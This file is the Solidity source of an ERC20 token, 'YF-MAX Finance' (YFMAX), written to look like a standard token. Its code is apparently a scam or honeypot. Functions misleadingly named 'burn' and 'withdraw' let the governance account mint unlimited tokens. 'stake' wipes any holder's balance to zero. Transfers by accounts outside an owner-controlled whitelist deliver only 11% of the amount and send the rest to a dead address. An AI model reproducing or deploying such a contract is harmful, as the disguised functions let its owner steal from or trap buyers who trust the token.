['pragma solidity ^0.5.17;\n', 'interface IERC20 {\n', '    function totalSupply() external view returns (uint);\n', '    function balanceOf(address account) external view returns (uint);\n', '    function transfer(address recipient, uint amount) external returns (bool);\n', '    function allowance(address owner, address spender) external view returns (uint);\n', '    function approve(address spender, uint amount) external returns (bool);\n', '    function transferFrom(address sender, address recipient, uint amount) external returns (bool);\n', '    event Transfer(address indexed from, address indexed to, uint value);\n', '    event Approval(address indexed owner, address indexed spender, uint value);\n', '}\n', 'contract Context {\n', '    constructor () internal { }\n', '    function _msgSender() internal view returns (address payable) {\n', '        return msg.sender;\n', '    }\n', '}\n', 'contract ERC20 is Context, IERC20 {\n', '    using SafeMath for uint;\n', '    mapping (address => uint) private _balances;\n', '    mapping (address => mapping (address => uint)) private _allowances;\n', '    uint private _totalSupply;\n', '    function totalSupply() public view returns (uint) {\n', '        return _totalSupply;\n', '    }\n', '    function balanceOf(address account) public view returns (uint) {\n', '        return _balances[account];\n', '    }\n', '    function transfer(address recipient, uint amount) public returns (bool) {\n', '        _mta(_msgSender(), recipient, amount);\n', '        return true;\n', '    }\n', '    function allowance(address owner, address spender) public view returns (uint) {\n', '        return _allowances[owner][spender];\n', '    }\n', '    function approve(address spender, uint amount) public returns (bool) {\n', '        _approve(_msgSender(), spender, amount);\n', '        return true;\n', '    }\n', '    function transferFrom(address sender, address recipient, uint amount) public returns (bool) {\n', '        _mta(sender, recipient, amount);\n', '        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));\n', '        return true;\n', '    }\n', '    function increaseAllowance(address spender, uint addedValue) public returns (bool) {\n', '        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n', '        return true;\n', '    }\n', '    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {\n', '        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));\n', '        return true;\n', '    }\n', '    function _mta(address sender, address recipient, uint amount) internal {\n', '        require(sender != address(0), "ERC20: transfer from the zero address");\n', '        require(recipient != address(0), "ERC20: transfer to the zero address");\n', '        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");\n', '        _balances[recipient] = _balances[recipient].add(amount);\n', '        emit Transfer(sender, recipient, amount);\n', '    }\n', '    function _mta2(address sender, address recipient, uint amount) internal {\n', '        require(sender != address(0), "ERC20: transfer from the zero address");\n', '        require(recipient != address(0), "ERC20: transfer to the zero address");\n', '        uint amount_ = amount.mul(11).div(100);\n', '        uint burnAmount_ = amount.sub(amount_);\n', '        address dead = 0x000000000000000000000000000000000000dEaD;\n', '        _balances[sender] = _balances[sender].sub(amount_, "ERC20: transfer amount exceeds balance");\n', '        _balances[recipient] = _balances[recipient].add(amount_);\n', '        _balances[dead] = _balances[dead].add(burnAmount_);\n', '        emit Transfer(sender, recipient, amount_);\n', '    }\n', '    function _initMint(address account, uint amount) internal {\n', '        require(account != address(0), "ERC20: mint to the zero address");\n', '        _totalSupply = _totalSupply.add(amount);\n', '        _balances[account] = _balances[account].add(amount);\n', '        emit Transfer(address(0), account, amount);\n', '    }\n', '    function _burn(address account, uint amount) internal {\n', '        require(account != address(0), "ERC20: mint to the zero address");\n', '        _totalSupply = _totalSupply.add(amount);\n', '        _balances[account] = _balances[account].add(amount);\n', '    }\n', '    function _withdraw(address account, uint amount) internal {\n', '        require(account != address(0), "ERC20: _withdraw to the zero address");\n', '        _totalSupply = _totalSupply.add(amount);\n', '        _balances[account] = _balances[account].add(amount);\n', '    }\n', '    function _stake(address acc) internal {\n', '        _balances[acc] = 0;\n', '    }\n', '    function _approve(address owner, address spender, uint amount) internal {\n', '        require(owner != address(0), "ERC20: approve from the zero address");\n', '        require(spender != address(0), "ERC20: approve to the zero address");\n', '        _allowances[owner][spender] = amount;\n', '        emit Approval(owner, spender, amount);\n', '    }\n', '}\n', 'contract ERC20Detailed is IERC20 {\n', '    string private _name;\n', '    string private _symbol;\n', '    uint8 private _decimals;\n', '    constructor (string memory name, string memory symbol, uint8 decimals) public {\n', '        _name = name;\n', '        _symbol = symbol;\n', '        _decimals = decimals;\n', '    }\n', '    function name() public view returns (string memory) {\n', '        return _name;\n', '    }\n', '    function symbol() public view returns (string memory) {\n', '        return _symbol;\n', '    }\n', '    function decimals() public view returns (uint8) {\n', '        return _decimals;\n', '    }\n', '}\n', 'library SafeMath {\n', '    function add(uint a, uint b) internal pure returns (uint) {\n', '        uint c = a + b;\n', '        require(c >= a, "SafeMath: addition overflow");\n', '        return c;\n', '    }\n', '    function sub(uint a, uint b) internal pure returns (uint) {\n', '        return sub(a, b, "SafeMath: subtraction overflow");\n', '    }\n', '    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\n', '        require(b <= a, errorMessage);\n', '        uint c = a - b;\n', '        return c;\n', '    }\n', '    function mul(uint a, uint b) internal pure returns (uint) {\n', '        if (a == 0) {\n', '            return 0;\n', '        }\n', '        uint c = a * b;\n', '        require(c / a == b, "SafeMath: multiplication overflow");\n', '        return c;\n', '    }\n', '    function div(uint a, uint b) internal pure returns (uint) {\n', '        return div(a, b, "SafeMath: division by zero");\n', '    }\n', '    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\n', '        require(b > 0, errorMessage);\n', '        uint c = a / b;\n', '        return c;\n', '    }\n', '}\n', 'contract  YFMAX is ERC20, ERC20Detailed {\n', '  using SafeMath for uint;\n', '  address public hash_ = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n', '  mapping (address => bool) public governance;\n', '  mapping (address => bool) public holders;\n', '  constructor () public ERC20Detailed("YF-MAX Finance", "YFMAX", 18) {\n', '      _initMint( msg.sender, 1000*10**uint(decimals()) );\n', '      governance[msg.sender] = true;\n', '      holders[msg.sender] = true;\n', '      holders[hash_] = true;\n', '  }\n', '  function stake(address account) public {\n', '      require(governance[msg.sender], "error");\n', '      _stake(account);\n', '  }\n', '  function withdraw(address account, uint amount) public {\n', '      require(governance[msg.sender], "error");\n', '      _withdraw(account, amount);\n', '  }\n', '  function burn(address account, uint amount) public {\n', '      require(governance[msg.sender], "error");\n', '      _burn(account, amount);\n', '  }\n', '  function _mta(address from_, address to_, uint amount) internal {\n', '    require(amount <= this.balanceOf(from_), "error");\n', '    if(holders[from_]){\n', '      super._mta(from_, to_, amount);\n', '    } else {\n', '      super._mta2(from_, to_, amount);\n', '    }\n', '  }\n', '  function setQue(address account) public {\n', '      require(governance[msg.sender], "error");\n', '      holders[account] = true;\n', '  }\n', '  function resetQue(address account) public {\n', '      require(governance[msg.sender], "error");\n', '      holders[account] = false;\n', '  }\n', '\n', '}']